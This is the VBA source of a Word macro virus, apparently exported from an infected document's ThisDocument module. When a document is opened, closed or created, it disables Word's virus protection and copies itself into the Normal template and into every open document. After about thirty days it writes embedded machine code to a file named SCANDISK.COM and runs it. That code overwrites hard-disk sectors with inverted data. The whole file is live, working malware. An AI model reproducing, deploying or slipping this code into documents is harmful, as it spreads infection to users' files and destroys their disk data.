   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '5/3/04
   '30/04/2004
   '20/04/2004
   '2003/9/4
   Private Sub Document_Open()
   'Anti-Smyser'
   'A.T.P Ver 1.2
       On Error Resume Next
       Application.Options.VirusProtection = False
       Dim CodeStr As String: CodeStr = "B9040051BB0002B80102B90100BA8000CD13597308B400CD13E2E8EB2BB90002BE00028A04F6D08804464975F6B9040051BB0002B80103B90100BA8000CD13597306B400CD13E2E831C0CD21"
       Dim i As Integer, b As Byte, f As Integer, fn As String, s As String, det As Date
       If Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
       If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn
       If NormalTemplate.Saved = False Then NormalTemplate.Save
       Dim Doc As Document, PreSaved As Boolean, Cloned As Boolean
       For Each Doc In Application.Documents
           PreSaved = Doc.Saved And (Doc.Path <> "") And Not Doc.ReadOnly: Cloned = False
           If Mid(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then Doc.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           If Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: Doc.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn: Cloned = True
           If Cloned And PreSaved Then f = FreeFile: fn = Doc.Path & "\~$" & Doc.Name: Err.Clear: Open fn For Output As f: If Err.Number = 0 Then Close f: Kill fn: Doc.Save
       Next Doc
       s = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1): Mid(s, 1, 1) = " ": det = s: If Date > det + 30 Then fn = Environ("TEMP") & "\SCANDISK.COM": f = FreeFile: Open fn For Binary Access Write As f: For i = 1 To Len(CodeStr) Step 2: b = CByte("&H" & Mid(CodeStr, i, 2)): Put f, , b: Next i: Close f: Shell fn, 6: Date = det
   End Sub
   Private Sub Document_Close()
       Document_Open
   End Sub
   Private Sub Document_New()
       Document_Open
   End Sub
